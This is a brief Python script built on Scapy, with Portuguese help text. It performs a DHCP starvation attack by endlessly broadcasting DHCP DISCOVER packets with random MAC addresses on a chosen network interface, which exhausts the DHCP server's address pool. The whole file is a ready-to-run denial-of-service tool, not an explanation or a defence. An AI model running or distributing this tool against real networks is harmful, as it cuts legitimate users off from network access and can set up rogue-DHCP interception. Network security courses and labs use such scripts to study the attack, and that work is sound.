import argparse
from scapy.all import *

def dhcp_starvation(iface):
    conf.checkIPaddr = False 

    DHCP_DISCOVER = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
                / IP(src='0.0.0.0', dst='255.255.255.255') \
                / UDP(dport=67, sport=68) \
                / BOOTP(op=1, chaddr=RandMAC()) \
                / DHCP(options=[('message-type', 'discover'), ('end')])


    sendp(DHCP_DISCOVER, iface=iface, loop=1, verbose=1)

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='Script para executar DHCP Starvation.')
    parser.add_argument('-i', '--interface', type=str, required=True, help='Interface de rede a ser usada para o ataque')
    

    args = parser.parse_args()
    
    dhcp_starvation(args.interface)

